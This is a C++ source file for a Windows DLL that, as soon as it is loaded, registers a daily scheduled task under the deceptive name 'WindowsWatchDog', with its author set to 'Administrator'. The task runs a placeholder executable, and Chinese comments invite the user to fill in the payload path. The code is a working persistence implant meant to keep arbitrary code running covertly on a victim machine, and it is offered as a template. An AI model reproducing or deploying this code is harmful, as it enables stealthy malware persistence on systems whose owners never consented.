#define _WIN32_DCOM

#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <comdef.h>
#include <taskschd.h>
#include "tlhelp32.h"
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

using namespace std;

int login(HANDLE han, LPWSTR filename)
{

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    string wszTaskName = "WindowsWatchDog";

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService);

    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);

    pRootFolder->DeleteTask(_bstr_t(wszTaskName.c_str()), 0);

    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);

    pService->Release();


    IRegistrationInfo* pRegInfo = NULL;
    hr = pTask->get_RegistrationInfo(&pRegInfo);

    hr = pRegInfo->put_Author(_bstr_t("Administrator"));
    pRegInfo->Release();

    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);

    hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
    pSettings->Release();

    // ...

    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);

    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_DAILY, &pTrigger);  // Change from TASK_TRIGGER_TIME to TASK_TRIGGER_DAILY
    pTriggerCollection->Release();

    IDailyTrigger* pDailyTrigger = NULL;  // Use IDailyTrigger interface instead of ITimeTrigger
    hr = pTrigger->QueryInterface(
        IID_IDailyTrigger, (void**)&pDailyTrigger);
    pTrigger->Release();

    hr = pDailyTrigger->put_Id(_bstr_t(L"Trigger1"));

    hr = pDailyTrigger->put_StartBoundary(_bstr_t(L"2022-01-01T12:00:00"));  // Set your desired start time here

    // Remove EndBoundary because it's not required for a daily trigger
    // hr = pTimeTrigger->put_EndBoundary(_bstr_t(L"2035-05-02T08:00:00"));

    hr = pDailyTrigger->put_DaysInterval(1);  // The task will be executed every day

    pDailyTrigger->Release();

    // ...


    IActionCollection* pActionCollection = NULL;

    hr = pTask->get_Actions(&pActionCollection);

    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();

    IExecAction* pExecAction = NULL;
    hr = pAction->QueryInterface(
        IID_IExecAction, (void**)&pExecAction);
    pAction->Release();

    hr = pExecAction->put_Path(filename);
    pExecAction->Release();
    IRegisteredTask* pRegisteredTask = NULL;
    VARIANT varPassword;
    varPassword.vt = VT_EMPTY; // 设置为空类型，表示无密码
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(wszTaskName.c_str()),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),  // 留空，使用当前登录的用户名
        varPassword,  // 无密码
        TASK_LOGON_INTERACTIVE_TOKEN,  // 更改为 TASK_LOGON_INTERACTIVE_TOKEN
        _variant_t(L""),
        &pRegisteredTask);

    if (FAILED(hr))
    {
        WriteConsole(han, L"\nError saving the Task", 23, new DWORD, 0);
        //printf("\nError saving the Task : %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    WriteConsole(han, L"Success", 8, new DWORD, 0);

    pRootFolder->Release();
    pTask->Release();
    pRegisteredTask->Release();
    CoUninitialize();
    return 0;
}



extern "C" __declspec(dllexport) BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPTSTR lpCmdLine,
    int nCmdShow
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:;
    {
        int pid;
        HANDLE h;
        PROCESSENTRY32 pe;
        HANDLE han;
        h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        pid = GetCurrentProcessId();
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(h, &pe)) {
            do {
                if (pe.th32ProcessID == pid) {
                    AttachConsole(pe.th32ParentProcessID);
                }
            } while (Process32Next(h, &pe));
        }
        han = GetStdHandle(STD_OUTPUT_HANDLE);
        CloseHandle(h);

        LPWSTR filename = const_cast<wchar_t*>(L"YourFixedFilename"); // 替换为你需要的固定文件名

        login(han, filename);
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

